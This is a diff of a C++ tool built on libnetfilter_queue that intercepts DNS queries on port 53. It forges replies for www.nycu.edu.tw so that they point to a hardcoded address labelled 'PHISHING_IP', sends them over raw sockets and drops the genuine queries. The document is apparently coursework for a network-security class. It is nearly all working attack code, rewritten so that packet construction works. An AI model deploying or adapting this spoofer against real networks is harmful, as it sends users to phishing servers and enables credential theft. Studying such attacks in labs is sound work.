@@ -1,6 +1,4 @@
 #include <iostream>
-#include <vector>
-#include <string>
 #include <cstring>
 #include <sys/socket.h>
 #include <arpa/inet.h>
@@ -8,27 +6,17 @@
 #include <netinet/udp.h>
 #include <libnetfilter_queue/libnetfilter_queue.h>
 #include <unistd.h>
-#include <thread>
-#include <mutex>
-#include <queue>
-#include <atomic>
-#include <cstdlib>
-#include <condition_variable>
-#include <errno.h>
 #include <csignal>
-
-#define NF_ACCEPT 1
-#define NF_DROP 0
+#include <cstdlib>
 
 using namespace std;
 
-char* TARGET_DOMAIN = "www.nycu.edu.tw";
-char* PHISHING_IP = "140.113.207.227";
+char* TARGET_DOMAIN = (char*)"www.nycu.edu.tw";
+char* PHISHING_IP = (char*)"140.113.207.227";
 
 struct nfq_handle* h = nullptr;
 struct nfq_q_handle* qh = nullptr;
 int nfd = -1;
-
 sig_atomic_t running = 1;
 
 struct DNS_header {
@@ -50,6 +38,104 @@ unsigned short checksum(unsigned short* buf, int nwords) {
     return (unsigned short)(~sum);
 }
 
+// 解析 domain name
+string parse_domain(unsigned char* dns_start) {
+    string domain;
+    int pos = 12; // DNS header size
+    while (dns_start[pos] != 0) {
+        int len = dns_start[pos];
+        if (!domain.empty()) domain += ".";
+        domain += string((char*)(dns_start + pos + 1), len);
+        pos += len + 1;
+    }
+    return domain;
+}
+
+// 計算 DNS 問題區長度
+int get_question_len(unsigned char* dns_start) {
+    int pos = 12;
+    while (dns_start[pos] != 0) pos++;
+    pos++; // null byte
+    pos += 4; // QTYPE + QCLASS
+    return pos;
+}
+
+// 構造並發送 spoof DNS 回應
+void send_spoof_response(struct iphdr* orig_iph, struct udphdr* orig_udph, unsigned char* dns_query, int dns_query_len) {
+    int answer_len = 16; // 固定長度的 answer
+    int dns_resp_len = dns_query_len + answer_len;
+    int udp_len = sizeof(struct udphdr) + dns_resp_len;
+    int ip_len = sizeof(struct iphdr) + udp_len;
+    unsigned char* packet = new unsigned char[ip_len];
+    memset(packet, 0, ip_len);
+
+    // IP header
+    struct iphdr* iph = (struct iphdr*)packet;
+    iph->ihl = 5;
+    iph->version = 4;
+    iph->tos = 0;
+    iph->tot_len = htons(ip_len);
+    iph->id = htons(rand() % 65536);
+    iph->frag_off = 0;
+    iph->ttl = 64;
+    iph->protocol = IPPROTO_UDP;
+    iph->saddr = orig_iph->daddr;
+    iph->daddr = orig_iph->saddr;
+    iph->check = 0;
+    iph->check = checksum((unsigned short*)iph, sizeof(struct iphdr)/2);
+
+    // UDP header
+    struct udphdr* udph = (struct udphdr*)(packet + sizeof(struct iphdr));
+    udph->source = orig_udph->dest;
+    udph->dest = orig_udph->source;
+    udph->len = htons(udp_len);
+    udph->check = 0; // 可選
+
+    // DNS header + question
+    memcpy(packet + sizeof(struct iphdr) + sizeof(struct udphdr), dns_query, dns_query_len);
+
+    // 修改 flags/ancount
+    unsigned char* resp = packet + sizeof(struct iphdr) + sizeof(struct udphdr);
+    struct DNS_header* dns = (struct DNS_header*)resp;
+    dns->flags = htons(0x8180);
+    dns->ancount = htons(1);
+
+    // Answer section
+    int ans_pos = dns_query_len;
+    // Name: pointer to question
+    resp[ans_pos++] = 0xc0;
+    resp[ans_pos++] = 0x0c;
+    // Type: A
+    resp[ans_pos++] = 0x00;
+    resp[ans_pos++] = 0x01;
+    // Class: IN
+    resp[ans_pos++] = 0x00;
+    resp[ans_pos++] = 0x01;
+    // TTL: 300
+    resp[ans_pos++] = 0x00;
+    resp[ans_pos++] = 0x00;
+    resp[ans_pos++] = 0x01;
+    resp[ans_pos++] = 0x2c;
+    // Data length: 4
+    resp[ans_pos++] = 0x00;
+    resp[ans_pos++] = 0x04;
+    // IP
+    in_addr addr;
+    inet_aton(PHISHING_IP, &addr);
+    memcpy(resp + ans_pos, &addr.s_addr, 4);
+
+    // 發送
+    int sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
+    int one = 1;
+    setsockopt(sockfd, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one));
+    struct sockaddr_in dest;
+    dest.sin_family = AF_INET;
+    dest.sin_addr.s_addr = iph->daddr;
+    sendto(sockfd, packet, ip_len, 0, (struct sockaddr*)&dest, sizeof(dest));
+    close(sockfd);
+    delete[] packet;
+}
+
 void signal_handler(int signum) {
     if(signum == SIGINT || signum == SIGTERM) {
         cout << "Shutting Down ..." << endl;
@@ -60,119 +146,9 @@ void signal_handler(int signum) {
     }
 }
 
-string parse_domain(unsigned char* header, int header_len) {
-    string domain;
-    int pos = sizeof(struct DNS_header);
-    while (pos < header_len) {
-        int len = header[pos];
-        if (len == 0 || pos + len >= header_len) break;
-        if (!domain.empty()) domain += ".";
-        domain += string((char*)(header + pos + 1), len);
-        pos += len + 1;
-    }
-    return domain;
-}
-
-unsigned char* build_dns_response(unsigned char* query, int query_len) {
-    // Find the end of the question section
-    int pos = sizeof(DNS_header);
-    // Copy domain name (QNAME)
-    while (pos < query_len && query[pos] != 0) pos++;
-    pos++; // null byte after QNAME
-    // QTYPE (2 bytes) + QCLASS (2 bytes)
-    pos += 4;
-    int question_len = pos;
-
-    // Allocate space for header + question + answer (16 bytes for answer)
-    int response_len = question_len + sizeof(DNS_header) + 16;
-    unsigned char* response = new unsigned char[question_len + 16];
-    memset(response, 0, question_len + 16);
-
-    // Copy DNS header
-    memcpy(response, query, sizeof(DNS_header));
-    DNS_header* dns = (DNS_header*)response;
-    dns->flags = htons(0x8180); // Standard response, recursion available, no error
-    dns->ancount = htons(1);    // 1 answer
-
-    // Copy question section
-    memcpy(response + sizeof(DNS_header), query + sizeof(DNS_header), question_len - sizeof(DNS_header));
-
-    int ans_pos = question_len;
-
-    // Answer section
-    // Name: pointer to domain name in question (offset 12 = 0x0c)
-    response[ans_pos++] = 0xc0;
-    response[ans_pos++] = 0x0c;
-
-    // Type: A (1)
-    response[ans_pos++] = 0x00;
-    response[ans_pos++] = 0x01;
-
-    // Class: IN (1)
-    response[ans_pos++] = 0x00;
-    response[ans_pos++] = 0x01;
-
-    // TTL: 0x0000012c (300 seconds)
-    response[ans_pos++] = 0x00;
-    response[ans_pos++] = 0x00;
-    response[ans_pos++] = 0x01;
-    response[ans_pos++] = 0x2c;
-
-    // Data length: 4
-    response[ans_pos++] = 0x00;
-    response[ans_pos++] = 0x04;
-
-    // Address: PHISHING_IP
-    in_addr addr;
-    inet_aton(PHISHING_IP, &addr);
-    memcpy(response + ans_pos, &addr.s_addr, 4);
-    ans_pos += 4;
-
-    return response;
-}
-
-void send_spoof_response(unsigned char* response, int response_len){
-    int sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_UDP);
-    if (sockfd < 0) {
-        cerr << "Error creating socket: " << strerror(errno) << endl;
-    }
-
-    int one = 1;
-    if (setsockopt(sockfd, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one)) < 0) {
-        cerr << "Error setting socket options: " << strerror(errno) << endl;
-        close(sockfd);
-        return;
-    }
-
-    struct iphdr* iph = (struct iphdr*)response;
-    struct sockaddr_in dest_addr;
-    memset(&dest_addr, 0, sizeof(dest_addr));
-    dest_addr.sin_family = AF_INET;
-    dest_addr.sin_addr.s_addr = iph->daddr;
-    if(sendto(sockfd, response, response_len, 0, (struct sockaddr*)&dest_addr, sizeof(dest_addr)) < 0) {
-        cerr << "Error sending response: " << strerror(errno) << endl;
-    }
-    close(sockfd);
-    return;
-}
-
-int calculate_dns_len(const string domain_name){
-    int domain_len = 0;
-    size_t start = 0, end;
-    while ((end = domain_name.find('.', start)) != string::npos) {
-        domain_len += (end - start) + 1; // length byte + label
-        start = end + 1;    
-    }
-    domain_len += (domain_name.length() - start) + 1; // last label + null byte
-    domain_len += 1;
-    return domain_len;
-}
-
 static int callback(struct nfq_q_handle* qh, struct nfgenmsg* nfmsg, struct nfq_data* nfa, void* data){
-
     unsigned char* packet;
     int packet_id = -1;
-
     auto ph = nfq_get_msg_packet_hdr(nfa);
     if (ph) packet_id = ntohl(ph->packet_id);
 
@@ -180,19 +156,16 @@ static int callback(struct nfq_q_handle* qh, struct nfgenmsg* nfmsg, struct nfq_
     if (payload_len >= 0){
         struct iphdr* iph = (struct iphdr*)packet;
         if (iph->protocol == IPPROTO_UDP){
-            cout << "Received UDP packet from " << inet_ntoa(*(in_addr*)&iph->saddr) 
-                 << " to " << inet_ntoa(*(in_addr*)&iph->daddr) << endl;
             struct udphdr* udph = (struct udphdr*)(packet + iph->ihl * 4);
             if (ntohs(udph->dest) == 53){
                 unsigned char* dns = packet + iph->ihl * 4 + sizeof(struct udphdr);
-                string DOMAIN = parse_domain(dns, sizeof(struct DNS_header));
+                int dns_query_len = payload_len - (iph->ihl * 4) - sizeof(struct udphdr);
+                string DOMAIN = parse_domain(dns);
                 if (DOMAIN == TARGET_DOMAIN){
                     cout << "INTERCEPTED query for "<< DOMAIN << endl;
-                    unsigned char* response = build_dns_response(dns, sizeof(struct DNS_header));
-                    int total_size = sizeof(struct iphdr) + sizeof(struct udphdr) + calculate_dns_len(DOMAIN);
-                    send_spoof_response(response, total_size);
+                    send_spoof_response(iph, udph, dns, dns_query_len);
                     return nfq_set_verdict(qh, packet_id, NF_DROP, 0, nullptr);
-                }   
+                }
             }
         }
     }
@@ -214,7 +187,6 @@ void CLEAN_FORWARD(){
 }
 
 int main (){
-    // Setup
     signal(SIGINT, signal_handler);
     signal(SIGTERM, signal_handler);
     h = nfq_open();
